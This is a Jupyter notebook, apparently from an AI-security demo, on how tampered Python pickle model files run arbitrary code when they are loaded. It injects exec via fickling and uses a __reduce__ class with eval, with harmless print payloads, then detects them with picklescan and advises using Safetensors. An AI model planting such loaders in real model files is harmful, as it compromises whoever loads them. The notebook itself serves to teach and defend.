# Pickle format malicious code exploit examples

This notebook includes steps to understand how Python model and dataset files stored in binary Pickle format can be exploited with arbitrary unsafe code, and should be avoided in favor of other formats as Safetensors.

## Prepare dependencies

We have loose transient dependencies, as we are only building an illustrative example

In [1]:
# %%capture
!pip install pickle-mixin==1.0.2
!pip install fickling==0.1.3
!pip install picklescan==0.0.16

fish: Unknown command: pip
fish: 
pip install pickle-mixin==1.0.2
^~^
fish: Unknown command: pip
fish: 
pip install fickling==0.1.3
^~^
fish: Unknown command: pip
fish: 
pip install picklescan==0.0.16
^~^


In [2]:
# Installing a specific version of scikit-learn will take a long time to compile for current host,
# do it only if there are errors in execution of the notebook
# !pip install scikit-learn==1.2.2

## Example 1: Tamper with an existing file

First we create a very small linear regresion model, and save it to disk in pickle binary format

In [3]:
from sklearn.linear_model import LinearRegression
from sklearn.datasets import make_regression
import pickle

# generate regression dataset
X, y = make_regression(n_samples=100, n_features=3, noise=0.1, random_state=1)

# train regression model
linear_model = LinearRegression()
linear_model.fit(X, y)

# summary of the model
print('Model intercept :', linear_model.intercept_)
print('Model coefficients : ', linear_model.coef_)
print('Model score : ', linear_model.score(X, y))

print("Saving model : ", "data/linear_regression.pkl")
with open("linear_regression.pkl", "wb") as f:
    pickle.dump(linear_model, f)

Model intercept : -0.010109549594716327
Model coefficients :  [44.18793068 98.97389468 58.17121618]
Model score :  0.9999993081899219
Saving model :  data/linear_regression.pkl


Now we modify the pickle binary file to include arbitrary code execution

In [4]:
from fickling.fickle import Pickled

with open("linear_regression.pkl", "rb") as f:
    p = Pickled.load(f)

p.insert_python_exec('print("you\'ve been pwned !")')

print("Saving tampered model : ", "linear_regression.pkl")
with open('linear_regression.pkl', 'wb') as f:
    p.dump(f)

Saving tampered model :  linear_regression.pkl


Let's now try to load the model file from disk, see what happens

In [5]:
import pickle
with open("linear_regression.pkl", "rb") as f:
    unpickled_linear_model = pickle.load(f)

you've been pwned !


The unsafe code has been executed just by loading the file, before we do any task with it.

We analyze the resulting modified file with `pickletools`.
You will see at the beggining the extra malicious code injected.

In [6]:
!python -m pickletools linear_regression.pkl

    0: \x80 PROTO      4
    2: \x95 FRAME      456
   11: c    GLOBAL     'builtins exec'
   26: (    MARK
   27: \x8c     SHORT_BINUNICODE 'print("you\'ve been pwned !")'
   57: t        TUPLE      (MARK at 26)
   58: R    REDUCE
   59: \x8c SHORT_BINUNICODE 'sklearn.linear_model._base'
   87: \x94 MEMOIZE    (as 0)
   88: \x8c SHORT_BINUNICODE 'LinearRegression'
  106: \x94 MEMOIZE    (as 1)
  107: \x93 STACK_GLOBAL
  108: \x94 MEMOIZE    (as 2)
  109: )    EMPTY_TUPLE
  110: \x81 NEWOBJ
  111: \x94 MEMOIZE    (as 3)
  112: }    EMPTY_DICT
  113: \x94 MEMOIZE    (as 4)
  114: (    MARK
  115: \x8c     SHORT_BINUNICODE 'fit_intercept'
  130: \x94     MEMOIZE    (as 5)
  131: \x88     NEWTRUE
  132: \x8c     SHORT_BINUNICODE 'copy_X'
  140: \x94     MEMOIZE    (as 6)
  141: \x88     NEWTRUE
  142: \x8c     SHORT_BINUNICODE 'tol'
  147: \x94     MEMOIZE    (as 7)
  148: G        BINFLOAT   1e-06
  157: \x8c     SHORT_BINUNICODE 'n_jobs'
  165: \x94     MEMOIZE    (as 8)
  166: N       

We **scan** the tampered pickle file with `picklescan`

In [7]:
!picklescan -p linear_regression.pkl

/Users/vicen/code/_vh/ai-security/pickle/linear_regression.pkl: dangerous import 'builtins exec' FOUND
----------- SCAN SUMMARY -----------
Scanned files: 1
Infected files: 1
Dangerous globals: 1


The scan has found a dangerous import

## Example 2: Construct malicious deserialization code

In this example, we construct a Python object that includes deserialization code that is insecure

In [8]:
import pickle

class Attack:
    def __reduce__(self):
        return (eval, ("print('Pwned again!')",))

print("Saving object at compromise.bin")
with open("compromise.bin", "wb") as f:
    pickle.dump(Attack(), f)

Saving object at compromise.bin


Let's see what happens when we load it

In [9]:
with open("compromise.bin", "rb") as f:
    unpickled_linear_model = pickle.load(f)

Pwned again!


Let's scan the pickle file

In [10]:
!picklescan -p linear_regression.pkl

/Users/vicen/code/_vh/ai-security/pickle/linear_regression.pkl: dangerous import 'builtins exec' FOUND
----------- SCAN SUMMARY -----------
Scanned files: 1
Infected files: 1
Dangerous globals: 1


## Conclusion
* This potential vulnerability is present on other binary formats, for models and dataset, not only Pickle
* Safetensors is one alternative that is safe from code injection
* Warning: the conversion tool from Pickle to Safetensors will trigger the malicious code
* Huggingface periodically scans pickle files.
  * But as they declare, will not 100% catch all ways to introduce malicious code, as they are exotic ways to avoid detection.
  * They will not remove files that have unsafe code execution, just flag them in their website.